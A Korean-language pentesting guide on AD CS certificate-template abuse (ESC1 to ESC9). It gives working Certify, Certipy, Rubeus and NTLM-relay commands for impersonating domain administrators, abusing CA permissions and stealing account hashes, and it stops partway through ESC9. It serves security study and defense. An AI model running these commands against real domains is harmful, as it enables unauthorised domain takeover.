# AD CS 도메인 상승

{{#include ../../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**이것은 게시물의 상승 기술 섹션 요약입니다:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 잘못 구성된 인증서 템플릿 - ESC1

### 설명

### 잘못 구성된 인증서 템플릿 - ESC1 설명

- **엔터프라이즈 CA에 의해 낮은 권한의 사용자에게 등록 권한이 부여됩니다.**
- **관리자 승인이 필요하지 않습니다.**
- **권한 있는 직원의 서명이 필요하지 않습니다.**
- **인증서 템플릿의 보안 설명자가 지나치게 관대하여 낮은 권한의 사용자가 등록 권한을 얻을 수 있습니다.**
- **인증서 템플릿은 인증을 용이하게 하는 EKU를 정의하도록 구성됩니다:**
- 클라이언트 인증 (OID 1.3.6.1.5.5.7.3.2), PKINIT 클라이언트 인증 (1.3.6.1.5.2.3.4), 스마트 카드 로그인 (OID 1.3.6.1.4.1.311.20.2.2), 모든 목적 (OID 2.5.29.37.0) 또는 EKU 없음 (SubCA)과 같은 확장 키 사용 (EKU) 식별자가 포함됩니다.
- **인증서 서명 요청 (CSR)에서 subjectAltName을 포함할 수 있는 요청자의 능력이 템플릿에 의해 허용됩니다:**
- Active Directory (AD)는 인증을 위해 인증서에서 subjectAltName (SAN)을 우선시합니다. 이는 CSR에서 SAN을 지정함으로써 인증서를 요청하여 어떤 사용자(예: 도메인 관리자)를 가장할 수 있음을 의미합니다. 요청자가 SAN을 지정할 수 있는지는 인증서 템플릿의 AD 객체에서 `mspki-certificate-name-flag` 속성을 통해 표시됩니다. 이 속성은 비트마스크이며, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 플래그가 존재하면 요청자가 SAN을 지정할 수 있습니다.

> [!CAUTION]
> 설명된 구성은 낮은 권한의 사용자가 선택한 SAN으로 인증서를 요청할 수 있도록 허용하여 Kerberos 또는 SChannel을 통해 어떤 도메인 주체로도 인증할 수 있게 합니다.

이 기능은 때때로 HTTPS 또는 호스트 인증서의 즉석 생성 지원을 위해 제품이나 배포 서비스에 의해 활성화되거나 이해 부족으로 인해 활성화됩니다.

이 옵션으로 인증서를 생성하면 경고가 발생하는데, 이는 기존 인증서 템플릿(예: `WebServer` 템플릿, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`가 활성화된 경우)을 복제한 후 인증 OID를 포함하도록 수정할 때는 발생하지 않습니다.

### 남용

**취약한 인증서 템플릿을 찾으려면** 다음을 실행할 수 있습니다:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
이 취약점을 **악용하여 관리자를 가장하기 위해** 다음을 실행할 수 있습니다:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
그런 다음 생성된 **인증서를 `.pfx`** 형식으로 변환하고 **Rubeus 또는 certipy**를 사용하여 다시 인증할 수 있습니다:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows 이진 파일 "Certreq.exe" 및 "Certutil.exe"는 PFX를 생성하는 데 사용할 수 있습니다: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD 포리스트의 구성 스키마 내에서 인증서 템플릿을 열거하는 것은, 특히 승인이나 서명이 필요하지 않고, 클라이언트 인증 또는 스마트 카드 로그온 EKU를 보유하며, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 플래그가 활성화된 템플릿에 대해 다음 LDAP 쿼리를 실행하여 수행할 수 있습니다:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 잘못 구성된 인증서 템플릿 - ESC2

### 설명

두 번째 남용 시나리오는 첫 번째 시나리오의 변형입니다:

1. Enterprise CA에 의해 저권한 사용자에게 등록 권한이 부여됩니다.
2. 관리자 승인 요구 사항이 비활성화됩니다.
3. 승인된 서명의 필요성이 생략됩니다.
4. 인증서 템플릿에 대한 지나치게 관대한 보안 설명자가 저권한 사용자에게 인증서 등록 권한을 부여합니다.
5. **인증서 템플릿은 Any Purpose EKU 또는 EKU가 없는 것으로 정의됩니다.**

**Any Purpose EKU**는 공격자가 **모든 목적**을 위해 인증서를 얻을 수 있도록 허용하며, 여기에는 클라이언트 인증, 서버 인증, 코드 서명 등이 포함됩니다. **ESC3에 사용된 동일한 기술**을 사용하여 이 시나리오를 악용할 수 있습니다.

**EKU가 없는** 인증서는 하위 CA 인증서로 작용하며, **모든 목적**을 위해 악용될 수 있으며 **새로운 인증서를 서명하는 데에도 사용될 수 있습니다**. 따라서 공격자는 하위 CA 인증서를 활용하여 새로운 인증서에 임의의 EKU 또는 필드를 지정할 수 있습니다.

그러나 **도메인 인증**을 위해 생성된 새로운 인증서는 하위 CA가 **`NTAuthCertificates`** 객체에 의해 신뢰되지 않는 경우 작동하지 않습니다. 이는 기본 설정입니다. 그럼에도 불구하고 공격자는 여전히 **임의의 EKU**와 임의의 인증서 값을 가진 **새로운 인증서**를 생성할 수 있습니다. 이러한 인증서는 잠재적으로 **다양한 목적**(예: 코드 서명, 서버 인증 등)으로 **남용될 수** 있으며, SAML, AD FS 또는 IPSec과 같은 네트워크의 다른 애플리케이션에 중대한 영향을 미칠 수 있습니다.

AD Forest의 구성 스키마 내에서 이 시나리오와 일치하는 템플릿을 나열하기 위해 다음 LDAP 쿼리를 실행할 수 있습니다:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 잘못 구성된 등록 에이전트 템플릿 - ESC3

### 설명

이 시나리오는 첫 번째와 두 번째와 비슷하지만 **다른 EKU** (인증서 요청 에이전트)를 **악용**하고 **2개의 다른 템플릿**을 사용합니다 (따라서 2세트의 요구 사항이 있습니다).

**인증서 요청 에이전트 EKU** (OID 1.3.6.1.4.1.311.20.2.1)는 Microsoft 문서에서 **등록 에이전트**로 알려져 있으며, 주체가 **다른 사용자를 대신하여 인증서에 등록**할 수 있도록 허용합니다.

**“등록 에이전트”**는 그러한 **템플릿**에 등록하고 결과로 생성된 **인증서를 사용하여 다른 사용자를 대신하여 CSR에 공동 서명**합니다. 그런 다음 **공동 서명된 CSR**을 CA에 **전송**하고, **“대신 등록”을 허용하는 템플릿**에 등록하며, CA는 **“다른” 사용자에게 속하는 인증서**로 응답합니다.

**요구 사항 1:**

- 엔터프라이즈 CA에 의해 저권한 사용자에게 등록 권한이 부여됩니다.
- 관리자 승인 요구 사항이 생략됩니다.
- 승인된 서명에 대한 요구 사항이 없습니다.
- 인증서 템플릿의 보안 설명자는 지나치게 관대하여 저권한 사용자에게 등록 권한을 부여합니다.
- 인증서 템플릿에는 인증서 요청 에이전트 EKU가 포함되어 있어 다른 주체를 대신하여 다른 인증서 템플릿을 요청할 수 있습니다.

**요구 사항 2:**

- 엔터프라이즈 CA는 저권한 사용자에게 등록 권한을 부여합니다.
- 관리자 승인이 우회됩니다.
- 템플릿의 스키마 버전은 1이거나 2를 초과하며, 인증서 요청 에이전트 EKU를 필요로 하는 애플리케이션 정책 발급 요구 사항을 지정합니다.
- 인증서 템플릿에 정의된 EKU는 도메인 인증을 허용합니다.
- CA에서 등록 에이전트에 대한 제한이 적용되지 않습니다.

### 악용

이 시나리오를 악용하려면 [**Certify**](https://github.com/GhostPack/Certify) 또는 [**Certipy**](https://github.com/ly4k/Certipy)를 사용할 수 있습니다:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**사용자**는 **등록 에이전트 인증서**를 **획득**할 수 있으며, 등록 **에이전트**가 등록할 수 있는 템플릿과 등록 에이전트가 대신하여 행동할 수 있는 **계정**은 엔터프라이즈 CA에 의해 제한될 수 있습니다. 이는 `certsrc.msc` **스냅인**을 열고, **CA를 마우스 오른쪽 버튼으로 클릭**한 다음, **속성 클릭** 후 “등록 에이전트” 탭으로 **이동**하여 달성됩니다.

그러나 CA의 **기본** 설정은 “**등록 에이전트를 제한하지 않음**”으로 설정되어 있음을 주목해야 합니다. 관리자가 등록 에이전트에 대한 제한을 활성화하면 “등록 에이전트를 제한”으로 설정하더라도 기본 구성은 여전히 매우 관대합니다. 이는 **모든 사람**이 누구로든 모든 템플릿에 등록할 수 있도록 허용합니다.

## 취약한 인증서 템플릿 접근 제어 - ESC4

### **설명**

**인증서 템플릿**에 대한 **보안 설명자**는 템플릿에 대해 특정 **AD 주체**가 보유한 **권한**을 정의합니다.

**공격자**가 **템플릿**을 **변경**하고 **이전 섹션**에서 설명된 **악용 가능한 잘못된 구성**을 **설치**할 수 있는 필수 **권한**을 보유하고 있다면, 권한 상승이 촉진될 수 있습니다.

인증서 템플릿에 적용 가능한 주목할 만한 권한은 다음과 같습니다:

- **소유자:** 객체에 대한 암묵적인 제어를 부여하여 모든 속성을 수정할 수 있습니다.
- **전체 제어:** 객체에 대한 완전한 권한을 부여하며, 모든 속성을 변경할 수 있는 능력을 포함합니다.
- **소유자 쓰기:** 공격자가 제어하는 주체로 객체의 소유자를 변경할 수 있도록 허용합니다.
- **DACL 쓰기:** 접근 제어를 조정할 수 있도록 하여 공격자에게 전체 제어를 부여할 수 있습니다.
- **속성 쓰기:** 모든 객체 속성을 편집할 수 있도록 허가합니다.

### 남용

이전과 유사한 권한 상승의 예:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4는 사용자가 인증서 템플릿에 대한 쓰기 권한을 가질 때 발생합니다. 이는 예를 들어 인증서 템플릿의 구성을 덮어써서 템플릿을 ESC1에 취약하게 만들기 위해 악용될 수 있습니다.

위 경로에서 볼 수 있듯이, 오직 `JOHNPC`만 이러한 권한을 가지고 있지만, 우리의 사용자 `JOHN`은 `JOHNPC`에 대한 새로운 `AddKeyCredentialLink` 엣지를 가지고 있습니다. 이 기술이 인증서와 관련이 있기 때문에, 저는 이 공격을 구현했으며, 이는 [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)로 알려져 있습니다. 피해자의 NT 해시를 검색하기 위한 Certipy의 `shadow auto` 명령의 작은 미리보기를 보여드립니다.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy**는 단일 명령으로 인증서 템플릿의 구성을 덮어쓸 수 있습니다. **기본적으로** Certipy는 구성을 **ESC1에 취약하도록 덮어씁니다**. 또한 **구성을 복원하는 데 유용할** **`-save-old` 매개변수를 지정할 수 있습니다**.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## 취약한 PKI 객체 접근 제어 - ESC5

### 설명

인증서 템플릿과 인증 기관을 넘어서는 여러 객체를 포함하는 ACL 기반 관계의 광범위한 웹은 전체 AD CS 시스템의 보안에 영향을 미칠 수 있습니다. 보안에 상당한 영향을 미칠 수 있는 이러한 객체는 다음과 같습니다:

- CA 서버의 AD 컴퓨터 객체로, S4U2Self 또는 S4U2Proxy와 같은 메커니즘을 통해 손상될 수 있습니다.
- CA 서버의 RPC/DCOM 서버.
- 특정 컨테이너 경로 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 내의 모든 하위 AD 객체 또는 컨테이너. 이 경로에는 인증서 템플릿 컨테이너, 인증 기관 컨테이너, NTAuthCertificates 객체 및 등록 서비스 컨테이너와 같은 컨테이너 및 객체가 포함되지만 이에 국한되지 않습니다.

낮은 권한의 공격자가 이러한 중요한 구성 요소 중 하나를 제어하게 되면 PKI 시스템의 보안이 손상될 수 있습니다.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 설명

[**CQure Academy 포스트**](https://cqureacademy.com/blog/enhanced-key-usage)에서 논의된 주제는 Microsoft에서 설명한 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 플래그의 의미를 다룹니다. 이 구성은 인증 기관(CA)에서 활성화되면 **사용자 정의 값**을 **주체 대체 이름**에 포함할 수 있도록 허용합니다. 이는 Active Directory®에서 구성된 요청을 포함하여 **모든 요청**에 해당합니다. 결과적으로, 이 조항은 **침입자**가 도메인 **인증**을 위해 설정된 **모든 템플릿**을 통해 등록할 수 있도록 합니다. 특히, 표준 사용자 템플릿과 같이 **비권한** 사용자 등록이 가능한 템플릿이 해당됩니다. 결과적으로, 인증서를 확보하여 침입자가 도메인 관리자 또는 도메인 내의 **다른 활성 엔터티**로 인증할 수 있게 됩니다.

**참고**: `certreq.exe`에서 `-attrib "SAN:"` 인수를 통해 인증서 서명 요청(CSR)에 **대체 이름**을 추가하는 방법은 ESC1의 SANs 악용 전략과 **대조**를 이룹니다. 여기서의 차이는 **계정 정보가 캡슐화되는 방식**에 있습니다—확장자가 아닌 인증서 속성 내에 있습니다.

### 남용

설정이 활성화되었는지 확인하기 위해 조직은 `certutil.exe`와 함께 다음 명령을 사용할 수 있습니다:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
이 작업은 본질적으로 **원격 레지스트리 액세스**를 사용하므로, 대안적인 접근 방식은 다음과 같을 수 있습니다:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) 및 [**Certipy**](https://github.com/ly4k/Certipy)와 같은 도구는 이 잘못된 구성을 감지하고 이를 악용할 수 있습니다:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
이 설정을 변경하려면 **도메인 관리자** 권한 또는 동등한 권한이 있다고 가정할 때, 다음 명령을 모든 워크스테이션에서 실행할 수 있습니다:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
이 구성을 비활성화하려면, 플래그를 다음과 같이 제거할 수 있습니다:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> 2022년 5월 보안 업데이트 이후, 새로 발급된 **certificates**는 **requester's `objectSid` property**를 포함하는 **security extension**을 포함합니다. ESC1의 경우, 이 SID는 지정된 SAN에서 파생됩니다. 그러나 **ESC6**의 경우, SID는 **requester's `objectSid`**를 반영하며, SAN이 아닙니다.\
> ESC6를 악용하기 위해서는 시스템이 ESC10(Weak Certificate Mappings)에 취약해야 하며, 이는 **새로운 security extension**보다 **SAN**을 우선시합니다.

## 취약한 인증서 기관 접근 제어 - ESC7

### 공격 1

#### 설명

인증서 기관에 대한 접근 제어는 CA 작업을 관리하는 일련의 권한을 통해 유지됩니다. 이러한 권한은 `certsrv.msc`에 접근하여 CA를 마우스 오른쪽 버튼으로 클릭하고, 속성을 선택한 다음, 보안 탭으로 이동하여 확인할 수 있습니다. 또한, PSPKI 모듈을 사용하여 다음과 같은 명령으로 권한을 열거할 수 있습니다:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
이것은 **`ManageCA`** 및 **`ManageCertificates`**라는 주요 권한에 대한 통찰력을 제공하며, 각각 “CA 관리자” 및 “인증서 관리자”의 역할과 관련이 있습니다.

#### 남용

인증 기관에서 **`ManageCA`** 권한을 가지면 주체가 PSPKI를 사용하여 원격으로 설정을 조작할 수 있습니다. 여기에는 SAN 사양을 모든 템플릿에서 허용하기 위해 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 플래그를 전환하는 것이 포함되며, 이는 도메인 상승의 중요한 측면입니다.

이 프로세스의 단순화는 PSPKI의 **Enable-PolicyModuleFlag** cmdlet을 사용하여 직접 GUI 상호작용 없이 수정할 수 있습니다.

**`ManageCertificates`** 권한을 소유하면 보류 중인 요청을 승인할 수 있어 "CA 인증서 관리자 승인" 보호 장치를 효과적으로 우회할 수 있습니다.

**Certify** 및 **PSPKI** 모듈의 조합을 사용하여 인증서를 요청, 승인 및 다운로드할 수 있습니다:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

> [!WARNING]
> In the **previous attack** **`Manage CA`** permissions were used to **enable** the **EDITF_ATTRIBUTESUBJECTALTNAME2** flag to perform the **ESC6 attack**, but this will not have any effect until the CA service (`CertSvc`) is restarted. When a user has the `Manage CA` access right, the user is also allowed to **restart the service**. However, it **does not mean that the user can restart the service remotely**. Furthermore, E**SC6 might not work out of the box** in most patched environments due to the May 2022 security updates.

따라서, 여기 또 다른 공격이 제시됩니다.

Perquisites:

- Only **`ManageCA` permission**
- **`Manage Certificates`** permission (can be granted from **`ManageCA`**)
- Certificate template **`SubCA`** must be **enabled** (can be enabled from **`ManageCA`**)

이 기술은 `Manage CA` _및_ `Manage Certificates` 접근 권한이 있는 사용자가 **실패한 인증서 요청을 발급할 수** 있다는 사실에 의존합니다. **`SubCA`** 인증서 템플릿은 **ESC1에 취약**하지만 **오직 관리자만** 템플릿에 등록할 수 있습니다. 따라서, **사용자**는 **`SubCA`**에 등록 요청을 할 수 있으며 - 이는 **거부될** 것이지만 - **그 후 관리자에 의해 발급될** 것입니다.

#### Abuse

You can **grant yourself the `Manage Certificates`** access right by adding your user as a new officer.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** 템플릿은 `-enable-template` 매개변수를 사용하여 CA에서 **활성화**할 수 있습니다. 기본적으로 `SubCA` 템플릿은 활성화되어 있습니다.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
이 공격을 위한 전제 조건을 충족했다면, **`SubCA` 템플릿을 기반으로 인증서를 요청하는 것**부터 시작할 수 있습니다.

**이 요청은 거부될 것입니다**, 하지만 우리는 개인 키를 저장하고 요청 ID를 기록해 두겠습니다.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
우리의 **`Manage CA` 및 `Manage Certificates`**를 사용하여 `ca` 명령과 `-issue-request <request ID>` 매개변수를 사용하여 **실패한 인증서** 요청을 **발급할 수 있습니다**.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
마지막으로, `req` 명령과 `-retrieve <request ID>` 매개변수를 사용하여 **발급된 인증서를 가져올 수 있습니다**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints – ESC8

### 설명

> [!NOTE]
> **AD CS가 설치된** 환경에서는 **웹 등록 엔드포인트가 취약**하고 **도메인 컴퓨터 등록 및 클라이언트 인증**을 허용하는 **인증서 템플릿이 게시**된 경우(기본 **`Machine`** 템플릿과 같은), **스풀러 서비스가 활성화된 모든 컴퓨터가 공격자에 의해 손상될 수 있습니다**!

AD CS는 관리자가 설치할 수 있는 추가 서버 역할을 통해 제공되는 여러 **HTTP 기반 등록 방법**을 지원합니다. 이러한 HTTP 기반 인증서 등록 인터페이스는 **NTLM 릴레이 공격**에 취약합니다. 공격자는 **손상된 머신에서 인바운드 NTLM을 통해 인증하는 모든 AD 계정을 가장할 수 있습니다**. 피해자 계정을 가장하는 동안, 공격자는 이러한 웹 인터페이스에 접근하여 **`User` 또는 `Machine` 인증서 템플릿을 사용하여 클라이언트 인증서 요청**을 할 수 있습니다.

- **웹 등록 인터페이스**(`http://<caserver>/certsrv/`에서 사용할 수 있는 오래된 ASP 애플리케이션)는 기본적으로 HTTP만 지원하며, NTLM 릴레이 공격에 대한 보호를 제공하지 않습니다. 또한, Authorization HTTP 헤더를 통해 NTLM 인증만 명시적으로 허용하여 Kerberos와 같은 더 안전한 인증 방법을 적용할 수 없게 만듭니다.
- **인증서 등록 서비스**(CES), **인증서 등록 정책**(CEP) 웹 서비스 및 **네트워크 장치 등록 서비스**(NDES)는 기본적으로 Authorization HTTP 헤더를 통해 협상 인증을 지원합니다. 협상 인증은 **Kerberos와 NTLM**을 모두 지원하여 공격자가 릴레이 공격 중에 **NTLM으로 다운그레이드**할 수 있게 합니다. 이러한 웹 서비스는 기본적으로 HTTPS를 활성화하지만, HTTPS만으로는 **NTLM 릴레이 공격으로부터 보호되지 않습니다**. HTTPS 서비스에 대한 NTLM 릴레이 공격으로부터의 보호는 HTTPS가 채널 바인딩과 결합될 때만 가능합니다. 불행히도, AD CS는 IIS에서 채널 바인딩에 필요한 인증에 대한 확장 보호를 활성화하지 않습니다.

NTLM 릴레이 공격의 일반적인 **문제**는 **NTLM 세션의 짧은 지속 시간**과 공격자가 **NTLM 서명을 요구하는 서비스와 상호작용할 수 없는** 것입니다.

그럼에도 불구하고, 이 제한은 NTLM 릴레이 공격을 이용하여 사용자의 인증서를 획득함으로써 극복됩니다. 인증서의 유효 기간이 세션의 지속 시간을 결정하며, 인증서는 **NTLM 서명을 요구하는 서비스와 함께 사용될 수 있습니다**. 도난당한 인증서를 사용하는 방법에 대한 지침은 다음을 참조하십시오:

{{#ref}}
account-persistence.md
{{#endref}}

NTLM 릴레이 공격의 또 다른 제한은 **공격자가 제어하는 머신이 피해자 계정에 의해 인증되어야 한다는 것**입니다. 공격자는 이 인증을 기다리거나 **강제로** 시도할 수 있습니다:

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **남용**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas`는 **활성화된 HTTP AD CS 엔드포인트**를 나열합니다:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` 속성은 기업 인증 기관(CA)이 인증서 등록 서비스(CES) 엔드포인트를 저장하는 데 사용됩니다. 이러한 엔드포인트는 도구 **Certutil.exe**를 사용하여 구문 분석하고 나열할 수 있습니다:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify를 이용한 악용
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

Certipy는 기본적으로 `Machine` 또는 `User` 템플릿을 기반으로 인증서 요청을 합니다. 이는 릴레이되는 계정 이름이 `$`로 끝나는지에 따라 결정됩니다. 대체 템플릿의 지정은 `-template` 매개변수를 사용하여 수행할 수 있습니다.

그런 다음 [PetitPotam](https://github.com/ly4k/PetitPotam)과 같은 기술을 사용하여 인증을 강제할 수 있습니다. 도메인 컨트롤러를 다룰 때는 `-template DomainController`를 지정해야 합니다.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### 설명

새로운 값 **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`)은 **`msPKI-Enrollment-Flag`**에 대해 ESC9로 언급되며, 인증서에 **새로운 `szOID_NTDS_CA_SECURITY_EXT` 보안 확장**을 포함하는 것을 방지합니다. 이 플래그는 `StrongCertificateBindingEnforcement`가 `1`로 설정될 때(기본 설정) 중요해지며, 이는 `2`로 설정된 경우와 대조됩니다. ESC9가 없으면 요구 사항이 변경되지 않기 때문에 Kerberos 또는 Schannel에 대한 더 약한 인증서 매핑이 악용될 수 있는 시나리오에서 그 중요성이 높아집니다(ESC10 참조).

이 플래그의 설정이 중요해지는 조건은 다음과 같습니다:

- `StrongCertificateBindingEnforcement`가 `2`로 조정되지 않거나(기본값은 `1`), `CertificateMappingMethods`에 `UPN` 플래그가 포함되어 있습니다.
- 인증서가 `msPKI-Enrollment-Flag` 설정 내에서 `CT_FLAG_NO_SECURITY_EXTENSION` 플래그로 표시됩니다.
- 인증서에 의해 클라이언트 인증 EKU가 지정됩니다.
- 다른 계정을 손상시키기 위해 모든 계정에 대해 `GenericWrite` 권한이 있습니다.

### 남용 시나리오

`John@corp.local`이 `Jane@corp.local`에 대해 `GenericWrite` 권한을 보유하고 있으며, `Administrator@corp.local`을 손상시키려는 목표가 있다고 가정합니다. `Jane@corp.local`이 등록할 수 있는 `ESC9` 인증서 템플릿은 `msPKI-Enrollment-Flag` 설정에서 `CT_FLAG_NO_SECURITY_EXTENSION` 플래그로 구성되어 있습니다.

처음에 `Jane`의 해시는 `John`의 `GenericWrite` 덕분에 Shadow Credentials를 사용하여 획득됩니다:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
그 후, `Jane`의 `userPrincipalName`이 `Administrator`로 수정되며, `@corp.local` 도메인 부분은 의도적으로 생략됩니다:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
이 수정은 `Administrator@corp.local`이 `Administrator`의 `userPrincipalName`으로서 구별되므로 제약을 위반하지 않습니다.

